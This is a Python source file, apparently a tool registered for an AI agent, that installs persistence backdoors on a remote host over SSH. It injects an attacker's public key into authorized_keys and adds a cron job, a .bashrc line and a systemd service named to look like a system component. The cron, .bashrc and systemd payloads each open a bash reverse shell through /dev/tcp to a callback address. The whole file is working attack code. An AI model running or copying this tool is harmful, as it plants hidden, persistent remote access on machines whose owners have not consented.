#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""持久化后门安装 - SSH公钥注入/crontab定时任务/systemd服务/.bashrc后门，多种方式确保权限维持

method 决定走哪条路，填 all 就挨个试。ssh_key 分支：给了 key_file 就用它，没给就
现场 ssh-keygen 一对 2048 位 RSA 丢到 /tmp/.pentest_key。
"""

import os

from registry import tool
from utils import run_cmd
from helpers import *  # noqa: F401,F403


@tool(
    "persist_install",
    "持久化后门安装 - SSH公钥注入/crontab定时任务/systemd服务/.bashrc后门，多种方式确保权限维持",
    {
        "properties": {
            "target": {
                "type": "string",
                "description": "目标IP",
            },
            "username": {
                "type": "string",
                "description": "SSH用户名",
            },
            "password": {
                "type": "string",
                "description": "SSH密码",
            },
            "key_file": {
                "type": "string",
                "description": "SSH私钥文件路径（如已有）",
            },
            "method": {
                "type": "string",
                "description": "持久化方式: ssh_key/cron/systemd/bashrc/at/all(全部尝试)",
                "default": "ssh_key",
            },
            "ssh_port": {
                "type": "integer",
                "description": "SSH端口（默认22）",
                "default": 22,
            },
            "callback_ip": {
                "type": "string",
                "description": "反弹Shell回调IP",
            },
            "callback_port": {
                "type": "integer",
                "description": "反弹Shell回调端口",
                "default": 4444,
            },
            "timeout": {
                "type": "integer",
                "description": "超时秒数（默认60）",
                "default": 60,
            },
        },
        "required": ["target", "username"],
    },
)
def persist_install_handler(params):
            target = params.get("target","")
            username = params.get("username","")
            password = params.get("password","")
            key_file = params.get("key_file","")
            method = params.get("method","ssh_key")
            ssh_port = int(params.get("ssh_port",22))
            callback_ip = params.get("callback_ip","")
            callback_port = int(params.get("callback_port",4444))
            timeout = int(params.get("timeout",60))
            ssh_opts = f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {ssh_port}"
            if key_file and os.path.isfile(key_file):
                ssh_cmd = f"ssh {ssh_opts} -i {key_file} {username}@{target}"
            elif password:
                ssh_cmd = f"sshpass -p '{password}' ssh {ssh_opts} {username}@{target}"
            else:
                return {"success":False,"returncode":-1,"output":"需要 password 或 key_file"}
            results = []
            if method in ("ssh_key","all"):
                if not os.path.isfile("/tmp/.pentest_key"):
                    run_cmd("ssh-keygen -t rsa -b 2048 -f /tmp/.pentest_key -N '' -q", 10)
                pubkey = ""
                if os.path.isfile("/tmp/.pentest_key.pub"):
                    with open("/tmp/.pentest_key.pub") as f: pubkey = f.read().strip()
                if pubkey:
                    r = run_cmd(f"{ssh_cmd} 'mkdir -p ~/.ssh && echo \"{pubkey}\" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && echo SSH_KEY_OK'", timeout)
                    results.append(f"[SSH密钥注入] {'成功' if 'SSH_KEY_OK' in r.get('output','') else '失败: '+r.get('output','')[:200]}")
            if method in ("cron","all"):
                payload = f"* * * * * /bin/bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1" if callback_ip else "@reboot /bin/bash -c 'sleep 30 && whoami > /tmp/.p'".replace("/",r"\/")
                r = run_cmd(f"{ssh_cmd} '(crontab -l 2>/dev/null; echo \"{payload}\") | crontab - && echo CRON_OK'", timeout)
                results.append(f"[Crontab持久化] {'成功' if 'CRON_OK' in r.get('output','') else '失败: '+r.get('output','')[:200]}")
            if method in ("bashrc","all"):
                rev = f"/bin/bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1" if callback_ip else "whoami > /tmp/.p"
                r = run_cmd(f"{ssh_cmd} 'echo \"nohup {rev} 2>/dev/null &\" >> ~/.bashrc && echo BASHRC_OK'", timeout)
                results.append(f"[.bashrc后门] {'成功' if 'BASHRC_OK' in r.get('output','') else '失败: '+r.get('output','')[:200]}")
            if method in ("systemd","all"):
                if callback_ip:
                    svc = f"[Unit]\\nDescription=System\\n[Service]\\nExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target"
                    r = run_cmd(f"{ssh_cmd} 'echo -e \"{svc}\" | sudo tee /etc/systemd/system/systemd-service.service && sudo systemctl enable systemd-service && sudo systemctl start systemd-service && echo SYSTEMD_OK' 2>&1", timeout)
                    results.append(f"[Systemd服务] {'成功' if 'SYSTEMD_OK' in r.get('output','') else '失败(可能需要sudo)'}")
            out = f"持久化安装: {target}\n" + "\n".join(results)
            if os.path.isfile("/tmp/.pentest_key"): out += "\n\n私钥: /tmp/.pentest_key（用于免密重连）"
            return {"success":True,"returncode":0,"output":out}
